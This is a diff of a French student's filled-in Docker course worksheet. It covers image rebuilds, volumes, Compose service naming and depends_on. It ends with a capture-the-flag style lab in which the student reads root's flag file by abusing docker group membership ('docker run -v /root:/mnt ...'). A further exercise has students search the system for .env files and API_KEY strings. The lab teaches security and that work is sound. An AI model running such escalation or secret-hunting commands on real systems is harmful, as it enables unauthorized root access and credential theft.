@@ -55,15 +55,15 @@ Voici les instructions dont vous aurez besoin (pas forcément dans cet ordre) :
 
 - Que se passe-t-il si vous modifiez `app.py` ? Pourquoi ?
 
-  > **Réponse :**
+  > **Réponse :** Les modifications ne sont pas prises en compte automatiquement dans le container déjà lancé. Il faut rebuild l’image puis relancer le container
 
 - Comment arrêtez-vous le container ?
 
-  > **Commande utilisée :**
+  > **Commande utilisée :** docker stop <container_id>
 
 - Quelle commande permet de voir les containers en cours d'exécution ?
 
-  > **Commande :**
+  > **Commande :** docker ps
 
 ### ✅ Checkpoint
 
@@ -95,10 +95,14 @@ Utilisez un volume pour voir les modifications en temps réel sans rebuild.
 - Pourquoi le changement est-il visible sans rebuild ?
 
   > **Réponse :**
+  Le changement est visible sans rebuild car le container utilise directement les fichiers de l'ordinateur grâce au volume.
 
 - Si vous ajoutez une nouvelle dépendance dans `requirements.txt`, est-ce que le volume suffit ? Pourquoi ?
 
   > **Réponse :**
+  Non car le volume partage seulement les fichiers. Or les dépendances Python sont installées dans l’image (via pip install)
+	Mais modifier requirements.txt ne relance pas pip install.
+  Il faut donc rebuild.
 
 ### ✅ Checkpoint
 
@@ -155,15 +159,24 @@ docker compose exec <service> <commande>
 
 - Pourquoi utilisez-vous `redis` comme hostname et pas `localhost` ?
 
-  > **Réponse :**
+  > **Réponse :
+
+  On utilise Redis car dans Docker Compose, chaque service a un nom réseau. Or redis est le nom du service et les containers communiquent via ce nom. 
+  A l'inverse localhost pointerait vers le container app lui-même et pas vers Redis.
 
 - Que fait `depends_on` ? Est-ce suffisant pour garantir que Redis est prêt ?
 
+
   > **Réponse :**
+
+  'depends_on' démarre Redis avant l'App. Toutefois cela lance le lance mais ne garantit pas que Redis est prêt à accepter les connexions.
 
 - Comment vérifiez-vous que Redis répond depuis l'intérieur du container app ?
 
-  > **Commande utilisée :**
+  > **Commande utilisée :
+
+  docker compose exec app sh
+  ping redis
 
 ### ✅ Checkpoint
 
@@ -347,11 +360,15 @@ ssh prenom@4.233.139.22
 
 **7.1.** Vérifiez vos droits actuels. Pouvez-vous lire `/root/flag.txt` ?
 
-> **Résultat de la commande :**
+> **Résultat de la commande :
+
+Permission denied
 
 **7.2.** Vérifiez vos groupes. Que remarquez-vous ?
 
-> **Groupes de votre utilisateur :**
+> **Groupes de votre utilisateur :
+
+foucault docker
 
 **7.3.** Trouvez un moyen d'exploiter votre appartenance au groupe `docker` pour accéder aux fichiers root.
 
@@ -359,10 +376,12 @@ ssh prenom@4.233.139.22
 
 > **Commande docker utilisée pour accéder à `/root/flag.txt` :**
 > ```
->
+>docker run -v /root:/mnt alpine cat /mnt/flag.txt
 > ```
 >
-> **Contenu de `/root/flag.txt` :**
+> **Contenu de `/root/flag.txt` :
+
+FLAG=3
 
 **7.4.** Scannez (avec `find -f` les fichiers qui pourraient être intéressants pour un acteur malveillant : `.env`, par exemple)
 Vous pouvez aussi scanner tous les fichiers du systeme, et filtrer avec `grep` des choses comme `API_KEY` et l'extraire
